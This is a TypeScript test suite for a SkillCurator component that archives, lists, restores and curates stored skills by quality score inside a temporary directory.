describe('SkillCurator', () => {
  let tempDir: string;
  let store: SkillStore;
  let manager: SkillManager;
  let curator: SkillCurator;
  let archiveDir: string;
  let backupDir: string;

  before(async () => {
    tempDir = createTempDir();
    archiveDir = path.join(tempDir, '.archive');
    backupDir = path.join(tempDir, '.backups');
    store = makeSkillStore(tempDir);
    manager = new SkillManager(store);
    curator = new SkillCurator(manager, archiveDir, backupDir);

    // Create test skills
    await manager.create('high-quality', 'Excellent skill content', {
      category: 'coding',
      tags: ['a'],
      source: 'user',
      qualityScore: 0.9,
      usageCount: 10,
    });
    await manager.create('medium-quality', 'Decent skill content', {
      category: 'coding',
      tags: ['b'],
      source: 'user',
      qualityScore: 0.6,
      usageCount: 5,
    });
    await manager.create('low-quality', 'Poor skill content', {
      category: 'general',
      tags: ['c'],
      source: 'user',
      qualityScore: 0.2,
      usageCount: 1,
    });
  });

  after(() => {
    rmdirRecursive(tempDir);
  });

  it('archive moves skill to archive directory', async () => {
    const result = await curator.archive('low-quality');
    assert.strictEqual(result, true);
    assert.ok(fs.existsSync(path.join(archiveDir, 'low-quality')), 'Archive dir should exist');
    assert.ok(
      !fs.existsSync(path.join(tempDir, '.commander', 'skills', 'low-quality')),
      'Original should be removed',
    );
  });

  it('listArchived returns archived skill names', async () => {
    const archived = await curator.listArchived();
    assert.ok(archived.includes('low-quality'), 'Should list the archived skill');
  });

  it('restore moves skill back from archive', async () => {
    const result = await curator.restore('low-quality');
    assert.strictEqual(result, true);
    const loaded = await manager.get('low-quality');
    assert.ok(loaded !== null, 'Skill should be restored');
    assert.ok(Math.abs(loaded!.metadata.qualityScore - 0.29) < 0.001);
  });

  it('archive handles non-existent skill gracefully', async () => {
    const result = await curator.archive('does-not-exist');
    assert.strictEqual(result, false);
  });

  it('restore handles non-existent archive gracefully', async () => {
    const result = await curator.restore('does-not-exist');
    assert.strictEqual(result, false);
  });

  it('restore fails if skill already exists at destination', async () => {
    // Archive then try to restore while original is still there
    await curator.archive('high-quality');
    await manager.create('high-quality', 'Recreated', {
      category: 'general',
      tags: [],
      source: 'user',
      qualityScore: 0.5,
      usageCount: 0,
    });
    const result = await curator.restore('high-quality');
    assert.strictEqual(result, false, 'Should not restore if destination exists');
    // Cleanup
    await manager.delete('high-quality');
    await curator.restore('high-quality');
  });

  it('curate pipeline archives low-quality skills', async () => {
    // Re-archive low-quality for the curate run
    await curator.archive('low-quality');
    // low-quality is already archived, so curate should find no more to archive
    const report = await curator.curate();
    assert.ok(report.totalBefore >= 0);
    assert.ok(report.runTimestamp.length > 0);
    assert.ok(Array.isArray(report.archived));
    assert.ok(Array.isArray(report.consolidated));
  });
});

